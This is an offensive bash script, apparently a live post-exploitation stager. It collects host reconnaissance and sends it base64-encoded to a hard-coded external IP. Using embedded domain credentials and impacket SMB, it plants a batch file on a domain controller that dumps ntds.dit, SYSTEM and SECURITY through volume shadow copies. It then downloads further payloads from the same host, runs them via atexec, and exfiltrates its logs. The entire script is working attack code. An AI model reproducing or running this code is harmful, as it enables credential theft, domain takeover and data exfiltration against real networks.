#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
# vss1: stage VSS-bat to DC .11 (overwrite .nd.bat) + atexec trigger + poller
export PYTHONPATH=/tmp/imp
O=/tmp/.VSS1.txt
: > "$O"
W_ATX="1de61119fde61709d0fc3226c41c0558"
W_PFX="b3ad2f0da57007d11858da6c3c75534b"
getb() { # b64url dest want
  for i in 1 2 3 4 5; do
    curl -sm90 "$1" -o /tmp/.tb64 2>/dev/null
    base64 -d /tmp/.tb64 > "$2" 2>/dev/null
    H=$(md5sum "$2" 2>/dev/null | cut -d' ' -f1)
    [ "$H" = "$3" ] && return 0
    sleep 4
  done
  return 1
}
# 1) stage vss bat via SMB put (overwrite C:\Windows\Temp\.nd.bat)
python3 - <<'PYEOF' >>/tmp/.VSS1.txt 2>&1
import sys, io
sys.path.insert(0, "/tmp/imp")
from impacket.smbconnection import SMBConnection
BAT = "\r\n".join([
 "@echo off",
 "vssadmin create shadow /for=C: > C:\\Windows\\Temp\\vssc.log 2>&1",
 "vssadmin create shadow /for=D: > C:\\Windows\\Temp\\vssd.log 2>&1",
 "set SHVC=",
 "set SHVD=",
 'for /f "delims=" %%a in (\'findstr /i /c:"GLOBALROOT" C:\\Windows\\Temp\\vssc.log\') do (for %%b in (%%a) do echo %%b|findstr /i /c:"GLOBALROOT" >nul && set SHVC=%%b)',
 'for /f "delims=" %%a in (\'findstr /i /c:"GLOBALROOT" C:\\Windows\\Temp\\vssd.log\') do (for %%b in (%%a) do echo %%b|findstr /i /c:"GLOBALROOT" >nul && set SHVD=%%b)',
 "mkdir C:\\nd 2>nul",
 'if defined SHVC copy "%SHVC%\\Windows\\NTDS\\ntds.dit" C:\\nd\\ntds.dit >>C:\\Windows\\Temp\\vssc.log 2>&1',
 'if defined SHVC copy "%SHVC%\\Windows\\System32\\config\\SYSTEM" C:\\nd\\SYSTEM >>C:\\Windows\\Temp\\vssc.log 2>&1',
 'if defined SHVC copy "%SHVC%\\Windows\\System32\\config\\SECURITY" C:\\nd\\SECURITY >>C:\\Windows\\Temp\\vssc.log 2>&1',
 'if defined SHVD copy "%SHVD%\\Windows\\NTDS\\ntds.dit" C:\\nd\\ntds.dit >>C:\\Windows\\Temp\\vssd.log 2>&1',
 'if defined SHVD copy "%SHVD%\\NTDS\\ntds.dit" C:\\nd\\ntds.dit >>C:\\Windows\\Temp\\vssd.log 2>&1',
 "type C:\\Windows\\Temp\\vssc.log >> C:\\Windows\\Temp\\nd.log 2>nul",
 "type C:\\Windows\\Temp\\vssd.log >> C:\\Windows\\Temp\\nd.log 2>nul",
 "echo done > C:\\Windows\\Temp\\nd.done",
 ""]) + "\r\n"
try:
    c = SMBConnection("10.61.10.11", "10.61.10.11", timeout=15)
    c.login("rez", "!QAZxsw2", "MLT", "", "")
    c.putFile("C$", "Windows\\Temp\\.nd.bat", io.BytesIO(BAT.encode("ascii")).read)
    print("vssbat put OK %d" % len(BAT))
    c.logoff()
except Exception as e:
    print("vssbat put ERR " + str(e)[:150])
PYEOF
# 2) payloads for trigger+poller
getb http://131.123.43.239/atx.b64 /tmp/.atx5.py "$W_ATX"  || echo "atx DL_FAIL" >> "$O"
getb http://131.123.43.239/pfx4.b64 /tmp/.pfx5.py "$W_PFX" || echo "pfx DL_FAIL" >> "$O"
if grep -q DL_FAIL "$O"; then
  curl -sm30 -X POST --data-binary @"$O" http://131.123.43.239/up -H "X-Name: mel2_vss1"
  exit 0
fi
cd /tmp
echo "== atexec vss ==" >> "$O"
timeout 150 python3 /tmp/.atx5.py 'MLT/rez:!QAZxsw2@10.61.10.11' 'cmd /q /c C:\Windows\Temp\.nd.bat' >> "$O" 2>&1
echo "== atx rc=$? ==" >> "$O"
python3 /tmp/.pfx5.py &
echo "poller spawned" >> "$O"
curl -sm30 -X POST --data-binary @"$O" http://131.123.43.239/up -H "X-Name: mel2_vss1"
echo VSS1_DONE
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


